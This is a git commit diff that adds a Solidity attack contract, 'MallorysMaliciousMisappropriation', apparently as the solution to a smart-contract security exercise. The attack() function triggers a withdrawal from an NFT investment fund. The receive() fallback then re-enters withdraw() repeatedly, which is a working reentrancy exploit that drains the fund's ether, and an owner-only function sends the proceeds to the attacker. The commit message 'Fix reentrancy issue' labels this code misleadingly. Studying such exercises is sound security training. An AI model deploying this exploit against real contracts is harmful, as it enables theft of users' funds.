11cdec943f8186fc7fda813840c03108ff9a99a3
Mihály Dobos-Kovács <3751182+as3810t@users.noreply.github.com>
2025-04-03 14:40:34 +0000

    Fix reentrancy issue

--- contracts/MallorysMaliciousMisappropriation.sol
+++ contracts/MallorysMaliciousMisappropriation.sol
@@ -8,7 +8,36 @@ import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
 contract MallorysMaliciousMisappropriation is Ownable {
 	NftInvestmentFund public nftInvestmentFund;
 
+	error InvestmentFundNotEnded();
+	error FailedToSendEther();
+
 	constructor(address payable _nftInvestmentFundAddress) Ownable(msg.sender) {
 		nftInvestmentFund = NftInvestmentFund(_nftInvestmentFundAddress);
+	}
+
+	function attack() external {
+		if (!nftInvestmentFund.ended()) revert InvestmentFundNotEnded();
+
+		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
+		fundToken.approve(address(nftInvestmentFund), fundToken.balanceOf(address(this)));
+
+		nftInvestmentFund.withdraw();
+	}
+
+	// solhint-disable-next-line no-complex-fallback
+	receive() external payable {
+		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
+		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) *
+			fundToken.balanceOf(address(this));
+
+		// The attack
+		if (address(nftInvestmentFund).balance >= withdrawAmount) {
+			nftInvestmentFund.withdraw();
+		}
+	}
+
+	function withdraw() external onlyOwner {
+		(bool sent, ) = payable(msg.sender).call{ value: address(this).balance }("");
+		if (!sent) revert FailedToSendEther();
 	}
 }
